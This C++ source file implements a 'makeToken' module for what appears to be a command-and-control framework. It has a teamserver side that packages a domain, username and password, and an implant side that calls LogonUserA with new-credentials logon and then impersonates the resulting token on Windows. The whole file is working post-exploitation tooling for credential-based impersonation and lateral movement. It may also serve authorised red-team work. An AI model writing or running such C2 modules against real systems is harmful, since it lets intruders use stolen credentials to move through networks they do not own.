#include "MakeToken.hpp"

#include <cstring>

#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#endif

#include "Common.hpp"


using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

constexpr std::string_view moduleName = "makeToken";
constexpr unsigned long long moduleHash = djb2(moduleName);

#define ERROR_INVALID_ARGS 1


#ifdef _WIN32

__declspec(dllexport) MakeToken* MakeTokenConstructor() 
{
    return new MakeToken();
}

#else

__attribute__((visibility("default"))) MakeToken* MakeTokenConstructor() 
{
    return new MakeToken();
}

#endif

MakeToken::MakeToken()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

MakeToken::~MakeToken()
{
}

std::string MakeToken::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "makeToken:\n";
    info += "Create a token from user and password and impersonate it. \n";
    info += "exemple:\n";
    info += "- makeToken DOMAIN\\Username Password\n";
#endif
    return info;
}

int MakeToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
    if(splitedCmd.size()==3)
    {
        // format DOMAIN\Username Password
        string usernameDomain="";
        string password="";
        std::string username="";
        std::string domain=".";
        
        usernameDomain = splitedCmd[1];
        password = splitedCmd[2];
        
        std::vector<std::string> splitedList;
        splitList(usernameDomain, "\\", splitedList);

        if(splitedList.size()==1)
            username = splitedList[0];
        else if(splitedList.size()>1)
        {
            domain = splitedList[0];
            username = splitedList[1];
        }

        std::string cmd = domain;
        cmd += ";";
        cmd += username;
        cmd += ";";
        cmd += password;

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_cmd(cmd);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif

    return 0;
}


int MakeToken::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const std::string cmd = c2Message.cmd();
    std::vector<std::string> fields;
    splitList(cmd, ";", fields);

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(cmd);
    c2RetMessage.set_returnvalue("");

    if (fields.size() != 3 || fields[1].empty() || fields[2].empty())
    {
        c2RetMessage.set_errorCode(1);
        return 0;
    }

#ifdef _WIN32
    HANDLE tokenHandle = nullptr;
    if (!LogonUserA(fields[1].c_str(), fields[0].c_str(), fields[2].c_str(),
            LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &tokenHandle))
    {
        c2RetMessage.set_errorCode(2);
        return 0;
    }
    const BOOL impersonated = ImpersonateLoggedOnUser(tokenHandle);
    CloseHandle(tokenHandle);
    if (!impersonated)
    {
        c2RetMessage.set_errorCode(3);
        return 0;
    }
    c2RetMessage.set_errorCode(0);
    c2RetMessage.set_returnvalue("User logged in and token impersonated successfully.\n");
#else
    c2RetMessage.set_errorCode(4);
#endif
    return 0;
}

int MakeToken::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
    switch (c2RetMessage.errorCode())
    {
    case 0: errorMsg.clear(); break;
    case 1: errorMsg = "Failed: Invalid arguments"; break;
    case 2: errorMsg = "Failed to log on with the supplied credentials."; break;
    case 3: errorMsg = "Failed to impersonate the new token."; break;
    case 4: errorMsg = "MakeToken is only supported on Windows."; break;
    default: errorMsg = "MakeToken failed with an unknown error."; break;
    }
#endif
    return 0;
}
